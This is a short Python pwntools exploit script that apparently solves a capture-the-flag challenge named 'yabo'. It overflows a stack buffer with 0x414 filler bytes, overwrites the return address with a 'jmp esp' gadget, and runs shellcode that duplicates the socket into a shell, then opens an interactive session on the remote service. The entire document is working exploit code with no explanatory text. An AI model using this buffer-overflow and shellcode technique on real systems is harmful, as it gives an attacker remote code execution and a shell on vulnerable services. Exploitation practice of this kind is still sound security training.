#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./yabo')

if args.REMOTE:
	p = remote('challenge.ctf.games', 32332)
else:
	p = remote('127.0.0.1', 9999)

shellcode = asm(shellcraft.dupsh(4))

log.info('len(shellcode): ' + str(len(shellcode)))

jmp_esp = next(binary.search(asm('jmp esp')))

payload  = b''
payload += 0x414 * b'A'
payload += p32(jmp_esp)
payload += shellcode

if payload.find(b'\0') != -1:
	log.critical('NULL in payload, exiting!')
	print(disasm(shellcode))
	sys.exit(1)

p.sendlineafter(b'say?: ',payload)
p.interactive()

